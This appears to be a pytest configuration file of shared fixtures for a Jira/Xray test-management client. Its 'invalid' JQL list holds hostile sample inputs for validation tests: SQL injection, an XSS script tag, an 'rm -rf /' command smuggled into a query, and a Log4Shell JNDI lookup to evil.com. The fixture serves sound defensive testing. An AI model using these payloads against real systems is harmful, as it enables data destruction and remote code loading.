"""Pytest configuration and shared fixtures."""

import pytest
import sys
from pathlib import Path
from unittest.mock import Mock, AsyncMock

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))


@pytest.fixture
def event_loop():
    """Create an instance of the default event loop for the test session."""
    import asyncio
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def mock_graphql_response():
    """Factory for creating mock GraphQL responses."""
    def _create_response(data=None, errors=None):
        response = {}
        if data is not None:
            response["data"] = data
        if errors is not None:
            response["errors"] = errors
        return response
    return _create_response


@pytest.fixture
def mock_auth_token():
    """Provide a mock authentication token."""
    return "mock-auth-token-12345"


@pytest.fixture
def sample_test_data():
    """Provide sample test data for testing."""
    return {
        "manual_test": {
            "issueId": "TEST-101",
            "testType": {"name": "Manual"},
            "steps": [
                {
                    "id": "1",
                    "action": "Open application",
                    "data": "URL: https://example.com",
                    "result": "Application loads successfully"
                },
                {
                    "id": "2", 
                    "action": "Click login button",
                    "data": "",
                    "result": "Login form appears"
                }
            ],
            "jira": {
                "key": "TEST-101",
                "summary": "Test user login flow",
                "status": {"name": "To Do"},
                "assignee": {"displayName": "Test User"}
            }
        },
        "cucumber_test": {
            "issueId": "TEST-102",
            "testType": {"name": "Cucumber"},
            "gherkin": """Scenario: Successful user login
  Given I am on the login page
  When I enter valid credentials
  And I click the login button
  Then I should be redirected to the dashboard""",
            "jira": {
                "key": "TEST-102",
                "summary": "Cucumber login test",
                "status": {"name": "In Progress"}
            }
        },
        "generic_test": {
            "issueId": "TEST-103",
            "testType": {"name": "Generic"},
            "unstructured": "Verify that the API endpoint returns 200 OK",
            "jira": {
                "key": "TEST-103",
                "summary": "API health check test",
                "status": {"name": "Done"}
            }
        }
    }


@pytest.fixture
def sample_execution_data():
    """Provide sample test execution data."""
    return {
        "issueId": "EXEC-201",
        "tests": {
            "total": 15,
            "start": 0,
            "limit": 100,
            "results": [
                {"issueId": "TEST-101", "testType": {"name": "Manual"}},
                {"issueId": "TEST-102", "testType": {"name": "Cucumber"}},
                {"issueId": "TEST-103", "testType": {"name": "Generic"}}
            ]
        },
        "jira": {
            "key": "EXEC-201",
            "summary": "Sprint 10 - Regression Testing",
            "status": {"name": "In Progress"},
            "assignee": {"displayName": "QA Team"}
        }
    }


@pytest.fixture
def jql_test_cases():
    """Provide JQL test cases for validation testing."""
    return {
        "valid": [
            'project = "TEST"',
            'project = "TEST" AND status = "In Progress"',
            'assignee = currentUser() AND status != "Done"',
            'created >= -7d AND project in ("TEST", "DEMO")',
            'labels = "regression" AND fixVersion = "2.0"',
            'issuetype = "Test" AND updated >= startOfWeek()',
            'text ~ "login" AND project = "TEST"'
        ],
        "invalid": [
            'project = "TEST"; DROP TABLE users;',
            'project = "TEST" OR 1=1--',
            'project = "TEST" UNION SELECT * FROM passwords',
            '<script>alert("XSS")</script>',
            'project = "TEST" && rm -rf /',
            'eval(atob("malicious"))',
            'project = "${jndi:ldap://evil.com/a}"'
        ]
    }


@pytest.fixture
def mock_aiohttp_session():
    """Create a mock aiohttp session."""
    session = AsyncMock()
    session.__aenter__ = AsyncMock(return_value=session)
    session.__aexit__ = AsyncMock(return_value=None)
    return session


# Markers for test categorization
def pytest_configure(config):
    """Register custom markers."""
    config.addinivalue_line(
        "markers", "unit: Unit tests that don't require external dependencies"
    )
    config.addinivalue_line(
        "markers", "integration: Integration tests that may require external services"
    )
    config.addinivalue_line(
        "markers", "security: Security-focused tests"
    )
    config.addinivalue_line(
        "markers", "slow: Tests that take longer to execute"
    )
    config.addinivalue_line(
        "markers", "asyncio: Tests that use asyncio"
    )